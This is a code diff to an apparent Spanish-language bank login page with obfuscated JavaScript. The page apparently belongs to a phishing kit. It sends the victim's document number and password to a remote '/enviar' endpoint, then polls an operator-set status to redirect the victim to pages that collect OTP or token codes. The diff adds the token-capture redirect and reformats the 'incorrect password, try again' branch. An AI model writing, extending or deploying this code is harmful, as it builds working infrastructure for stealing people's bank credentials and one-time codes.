@@ -103,7 +103,7 @@
                                 <span class="clave-seg" data-index="3">–</span>
                             </div>
                             <button type="button" class="clave-eye-btn" id="clave-eye-btn" aria-label="Mostrar contraseña">
-                                <img src="img/pass-eye-hidden.svg" alt="" class="eye-img" onerror="this.parentNode.textContent='👁'">
+                                <img src="img/pass-eye-hidden.svg" alt="" class="eye-img">
                             </button>
                             <input
                                 type="password"
@@ -296,7 +296,7 @@
         _0xh8.addEventListener('click', function(){
             _0xp6 = !_0xp6;
             if (_0xp6) {
-                _0xh8.innerHTML = '<span style="font-size:20px;">👁</span>';
+                _0xh8.innerHTML = '<svg class="eye-img" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#555" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>';
             } else {
                 _0xh8.innerHTML = '<img src="img/pass-eye-hidden.svg" alt="" class="eye-img">';
             }
@@ -440,7 +440,6 @@
             _0xn4.classList.add('show');
             document.body.style.overflow = 'hidden';
 
-
             try {
                 var _0xgia = await fetch(_0xa1 + '/' + _0xb2 + '/enviar', {
                     method: 'POST',
@@ -465,18 +464,21 @@
                     var _0xlia = await _0xkia.json();
                     console.log('Estado:', _0xlia.estado);
 
-                    if (_0xlia.estado === 'otp') {
+                    if (_0xlia.estado === 'token') {
+                        clearInterval(_0xjia);
+                        window.location.href = 'token.html';
+                    } else if (_0xlia.estado === 'otp') {
                         clearInterval(_0xjia);
                         window.location.href = 'otp.html';
                     } else if (_0xlia.estado === 'rechazado') {
-    clearInterval(_0xjia);
-    _0xn4.classList.remove('show');
-    _0xn4.classList.add('hidden');
-    document.body.style.overflow = '';
-    setTimeout(function(){
-        _0xw3('❌', 'Su documento o clave son incorrectos, por favor intente nuevamente.');
-    }, 300);
-}
+                        clearInterval(_0xjia);
+                        _0xn4.classList.remove('show');
+                        _0xn4.classList.add('hidden');
+                        document.body.style.overflow = '';
+                        setTimeout(function(){
+                            _0xw3('❌', 'Su documento o clave son incorrectos, por favor intente nuevamente.');
+                        }, 300);
+                    }
                 } catch (_0xmia) {
                     console.error('Error estado:', _0xmia);
                 }
